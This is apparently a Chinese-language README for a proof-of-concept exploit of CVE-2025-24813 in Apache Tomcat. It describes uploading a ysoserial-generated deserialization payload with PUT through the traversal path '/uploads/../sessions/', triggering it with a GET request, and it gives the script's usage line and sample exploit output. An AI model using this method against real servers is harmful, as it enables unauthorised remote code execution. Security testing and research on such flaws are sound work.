README.md
# CVE-2025-24813 Apache Tomcat RCE 漏洞验证代码
本项目提供了一个概念验证（PoC），用于利用 CVE-2025-24813，这是一个 Apache Tomcat 中的远程代码执行（RCE）漏洞。该漏洞允许攻击者上传恶意序列化负载到服务器，当满足特定条件时，通过反序列化机制实现任意代码执行。
---

## 描述

**CVE-2025-24813** 是一个理论上的 Apache Tomcat 远程代码执行（RCE）漏洞，它利用了服务器对上传会话文件和反序列化机制的不当处理。通过将精心制作的负载上传到可写目录（例如 `/uploads/../sessions/`），攻击者可以在服务器处理上传的会话文件并触发负载反序列化时，执行任意命令。

---

## 成功利用的前提条件

为了使此 PoC 成功利用漏洞，必须满足以下条件：

1. **Apache Tomcat 版本**: 目标服务器必须运行易受攻击的 Apache Tomcat 版本。
2. **可写目录**: 服务器必须允许 PUT 请求。
3. **反序列化触发**: 服务器必须处理上传的会话文件（例如，通过 GET 请求访问 `/index.jsp`）并触发负载的反序列化。
4. **Java 环境**: 攻击者的机器上必须安装 Java，以便使用 `ysoserial` 或编译基于 Java 的负载。
5. **ysoserial (可选)**: 如果使用 `ysoserial` 类型的负载，本地必须有 `ysoserial.jar` 文件。

---

~~~
python CVE-2025-24813.py <目标URL> [选项]
~~~

## 输出
* 成功利用:
[+] 服务器可通过PUT写入: http://localhost:8081/check.txt 
[*] 会话ID: absholi7ly 
[+] 负载生成成功: payload.ser 
[+] 负载上传状态为409(冲突): http://localhost:8081/uploads/../sessions/absholi7ly.session 
[+] 利用成功！反序列化后服务器返回500。 
[+] 目标 http://localhost:8081 易受 CVE-2025-24813 攻击！ 
[+] 临时文件已删除: payload.ser
* 利用失败:
[+] 服务器可通过PUT写入: http://localhost:8081/check.txt 
[*] 会话ID: absholi7ly 
[+] 负载生成成功: payload.ser 
[-] 负载上传失败: http://localhost:8081/uploads/../sessions/absholi7ly.session (HTTP 403) 
[-] 目标 http://localhost:8081 不易受攻击或利用失败。 
[+] 临时文件已删除: payload.ser